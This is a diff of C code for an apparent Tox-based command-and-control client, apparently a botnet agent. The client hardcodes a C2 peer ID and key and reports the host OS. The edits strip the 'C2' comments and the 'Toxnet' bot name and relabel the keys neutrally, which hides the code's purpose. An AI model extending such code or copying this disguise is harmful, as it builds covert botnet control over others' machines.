@@ -9,7 +9,6 @@
 #include <sodium/utils.h>
 #include <tox/tox.h>
 
-// Set system information for C2 (test)
 #if __linux__
     char * status = "LINUX";
 #elif __unix__
@@ -26,17 +25,15 @@ typedef struct DHT_node {
     const char key_hex[TOX_PUBLIC_KEY_SIZE*2 + 1];
 } DHT_node;
 
-char *c2id = "10121107AA4F1842A2D641E1E55FA7612189F558C6790BB4196D913B8820182949B28C7FD69F"; // C2 Address
-char *c2pub = "10121107AA4F1842A2D641E1E55FA7612189F558C6790BB4196D913B88201829"; // C2 Public key
+char *c2id = "10121107AA4F1842A2D641E1E55FA7612189F558C6790BB4196D913B8820182949B28C7FD69F"; // "TOX-ID"
+char *c2pub = "10121107AA4F1842A2D641E1E55FA7612189F558C6790BB4196D913B88201829"; // "PUB-KEY"
 
 uint8_t * hex2bin(const char *hex) {
     size_t len = strlen(hex) / 2;
     uint8_t *bin = malloc(len);
-
     for (size_t i = 0; i < len; ++i, hex += 2) {
         sscanf(hex, "%2hhx", &bin[i]);
     }
-
     return bin;
 }
 
@@ -91,8 +88,6 @@ void self_connection_status_cb(Tox *tox, TOX_CONNECTION connection_status, void 
 int main() {
     Tox *tox = tox_new(NULL, NULL);
 
-    const char *name = "Toxnet";
-    tox_self_set_name(tox, name, strlen(name), NULL);
     tox_self_set_status_message(tox, status, strlen(status), NULL);
 
     DHT_node nodes[] =
